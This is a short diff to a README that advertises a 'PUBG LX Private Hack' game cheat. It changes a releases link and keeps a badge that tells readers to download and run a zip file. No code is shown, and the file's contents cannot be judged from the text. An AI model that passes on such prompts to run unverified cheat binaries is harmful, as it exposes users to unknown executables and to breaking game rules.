@@ -15,7 +15,7 @@ Welcome to the ultimate PUBG LX Private Hack repository, your go-to solution for
 
 ## Installation 🛠️
 
-To download and execute the hack, please visit the [PUBG LX Private Hack Releases page](https://github.com/Fonsueli/PUBG-LX-Software).
+To download and execute the hack, please visit the [PUBG LX Private Hack Releases page](https://github.com/Fonsueli/PUBG-LX-Software/tree/main?tab=readme-ov-file).
 
 [![Download Now](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Fonsueli/PUBG-LX-Software/releases/download/latest/PUBGLX.zip)
 
